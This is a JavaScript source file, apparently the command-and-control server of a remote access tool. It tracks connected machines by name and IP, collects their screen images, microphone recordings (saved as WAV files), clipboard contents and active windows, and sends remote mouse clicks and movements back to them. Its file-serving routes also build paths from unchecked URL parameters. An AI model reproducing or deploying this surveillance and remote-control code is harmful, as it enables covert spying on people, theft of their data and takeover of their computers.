const path = require("path")
const express = require("express");
const bodyParser = require('body-parser');
const fs = require("fs")

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

const port = 3000;
const { clientThread } = require("./clientThread.js")

let consoleData = {"clients":[0,0,0],"output":[]};
let clientList = []

const { Server } = require("socket.io");
const io = new Server(5454);

io.on("connection", (socket) => {
    socket.on("newClient", (data) => {
        consoleData["clients"][0] += 1
        consoleData["clients"][1] += 1

        let address = socket.handshake.address;
        let id = clientList.length

        let settings = data[0]


        socket.data.clientData = data[1]
        socket.data.id = id
        socket.data.name = settings.name


        settings.name = settings.name + "-" + String(id)
        socket.data.exportData = settings 
        
        

        consoleData["output"].push([`New connection : ${settings.name} connected as IP ${address}`,new Date(),1])

        clientList.push(new clientThread(settings.name,address,socket,id))

    });
    socket.on("recvIdleTime",(seconds) => {

        if(seconds < 5) socket.data.exportData.idleTime = "Not Idle"
        else{
            let h = Math.floor(seconds / 3600).toString().padStart(2,'0')
            let m = Math.floor(seconds % 3600 / 60).toString().padStart(2,'0')
            let s = Math.floor(seconds % 60).toString().padStart(2,'0')
        
            socket.data.exportData.idleTime = `${h}:${m}:${s}`;
        }
    })
    socket.on("recvUpTime",(seconds) => {

        let h = Math.floor(seconds / 3600).toString().padStart(2,'0')
        let m = Math.floor(seconds % 3600 / 60).toString().padStart(2,'0')
        let s = Math.floor(seconds % 60).toString().padStart(2,'0')
    
        socket.data.exportData.upTime = `${h}:${m}:${s}`;
    })
    socket.on("recvActiveWindow",(window) => {
        socket.data.exportData.activeWindow = window;
    })

    socket.on("pong", () => {
        socket.data.exportData.ping = Date.now() - socket.data.pingAttempt 
    })

    socket.on("disconnecting", () => {
        consoleData["output"].push([`Connection lost : ${clientList[socket.data.id].name} connected as IP ${socket.handshake.address}`,new Date(),2])
        consoleData["clients"][1] -= 1
        consoleData["clients"][2] += 1

        setTimeout(() => {
            clientList[socket.data.id].disconnected(clientList)
        }, 100);
    });

    //actual Command function
    socket.on("screenshare",(imgData) => {
        if(imgData == "error") return
        var ret = Object.assign({}, imgData, {
            frame: Buffer.from(imgData, 'base64').toString() // from buffer to base64 string
        })
        socket.data.img = ret.frame
    })

    socket.on("remoteMicrophone",(audioData) => {
        socket.data.remoteMicrophone = audioData[0]
    })

    socket.on("clipBoard",(clipBoard) => {
        socket.data.clipBoard = clipBoard[0]
    })
});

app.use("/static",express.static("public"));

app.get("/", function (req, res) {
    res.sendFile(path.join(__dirname, 'templates/console.html'));
});
app.get("/:file", function (req, res) {
    let file = req.params.file
    res.sendFile(path.join(__dirname, `templates/${file}.html`));
});
app.get("/audio/:dir/:file", function (req, res) {
    let file = req.params.file
    let dir = req.params.dir

    res.sendFile(path.join(__dirname, `audio/${dir}/${file}`));
});

app.get("/static/:file", function (req, res) {
    res.sendFile(path.join(__dirname, `static/${req.params.file}`));
});
app.get("/static/:path/:file", function (req, res) {
    res.sendFile(path.join(__dirname, `static/${req.params.path}/${req.params.file}`));
});

app.get("/request/fetchConsole", function(req,res) {
    res.status(200).send(consoleData);
})
app.get("/request/fetchClients", function(req,res) {
    
    let data = {}
    
    for(let client of clientList){
        client.socket.data.pingAttempt = Date.now()

        client.socket.emit("getping")
        client.socket.emit("getIdleTime")
        client.socket.emit("getUpTime")
        client.socket.emit("getActiveWindow")

        data[client.socket.id] = client.socket.data.exportData
    }
    res.status(200).send(data);
})



//actual command function
function getClient(socketid){
    for(let client of clientList){
        if (client.socket.id == socketid){
            return client
        }
    }
    return false
}

app.get("/request/getName/:socketID",function(req,res){
    let client = getClient(req.params.socketID)
    if(client){
        let data = {"name":client.socket.data.name}
        res.status(200).send(data);
    }
})
app.get("/request/getMicrophoneList/:socketID",function(req,res){
    let client = getClient(req.params.socketID)
    if(client){
        let data = {"microphoneList":client.socket.data.clientData.microphoneList}
        res.status(200).send(data);
    }
})
app.get("/request/getClipBoard/:socketID",function(req,res){
    let client = getClient(req.params.socketID)
    if(client){
        let data = {"clipBoard":client.socket.data.clipBoard}
        res.status(200).send(data);
    }
})


app.post("/clients/:socketid/params",function(req,res) {
    const socketid = req.params.socketid
    let data = req.body
    let client = getClient(socketid)
    client.socket.emit("updateParams",data)

    res.status(200).send("ok")
})

app.post("/clients/:socketid/click",function(req,res){
    const socketid = req.params.socketid
    let data = req.body
    
    let percentageX = data.clickX/data.maxX
    let percentageY = data.clickY/data.maxY

    let client = getClient(socketid)
    if(client){
        let resolutionList = client.socket.data.clientData.resolutionList[0] //change [0]
        
        let clientX = Math.floor(percentageX*Number(resolutionList[0]))
        let clientY = Math.floor(percentageY*Number(resolutionList[1]))

        client.socket.emit("sendClick",{"x":clientX,"y":clientY})
    }
    res.status(200).send("ok")
})

app.post("/clients/:socketid/mouseAction",function(req,res){
    const socketid = req.params.socketid
    let data = req.body
    
    let percentageX = data.clickX/data.maxX
    let percentageY = data.clickY/data.maxY

    let action = data.action

    let client = getClient(socketid)
    if(client){
        let resolutionList = client.socket.data.clientData.resolutionList[0] //change [0]
        
        let clientX = Math.floor(percentageX*Number(resolutionList[0]))
        let clientY = Math.floor(percentageY*Number(resolutionList[1]))

        client.socket.emit(action,{"x":clientX,"y":clientY})
    }
    res.status(200).send("ok")
})

app.post("/clients/:socketid/Rclick",function(req,res){
    const socketid = req.params.socketid
    let data = req.body
    
    let percentageX = data.clickX/data.maxX
    let percentageY = data.clickY/data.maxY

    let client = getClient(socketid)
    if(client){
        let resolutionList = client.socket.data.clientData.resolutionList[0] //change [0]
        
        let clientX = Math.floor(percentageX*Number(resolutionList[0]))
        let clientY = Math.floor(percentageY*Number(resolutionList[1]))

        client.socket.emit("sendRClick",{"x":clientX,"y":clientY})
    }
    res.status(200).send("ok")
})

app.post("/clients/:socketid/moveMouse",function(req,res){
    const socketid = req.params.socketid
    let data = req.body
    
    let percentageX = data.posX/data.maxX
    let percentageY = data.posY/data.maxY

    let client = getClient(socketid)
    if(client){
        let resolutionList = client.socket.data.clientData.resolutionList[0] //change [0]
        
        let clientX = Math.floor(percentageX*Number(resolutionList[0]))
        let clientY = Math.floor(percentageY*Number(resolutionList[1]))

        client.socket.emit("moveMouse",{"x":clientX,"y":clientY})
    }
    res.status(200).send("ok")
})

app.get("/clients/:category/:socketid/:command",function(req,res){
    res.sendFile(path.join(__dirname, `templates/${req.params.category}/${req.params.command}.html`));
})
app.get("/clients/:socketid/remoteDesktop", function(req,res){
    const socketid = req.params.socketid
    let client = getClient(socketid)

    if(client){
        client.socket.emit("screenshare")
        res.status(200).send({"img":client.socket.data.img});
    }
})


app.get("/clients/:socketid/remoteMicrophone", function(req,res){
    const socketid = req.params.socketid
    let client = getClient(socketid)

    if(client){
        client.socket.emit("remoteMicrophone")
        if(client.socket.data.remoteMicrophone){

            var directory = "./audio/" + client.socket.data.name
            if(!fs.existsSync(directory)) fs.mkdirSync(directory);
            let filename = "audio/REDSHIP/microRec" + Math.floor(Math.random()*1000000) + ".wav"
            const wstream = fs.createWriteStream(filename);
            wstream.write(client.socket.data.remoteMicrophone);
            wstream.on("ready",()=> {
                res.status(200).send({"path":filename})
            })
        }else{
            res.status(200).send({"path":"notloaded"})
        }
    }
})



app.listen(port, function () {
    console.log(`Listening ${port}!`);
});



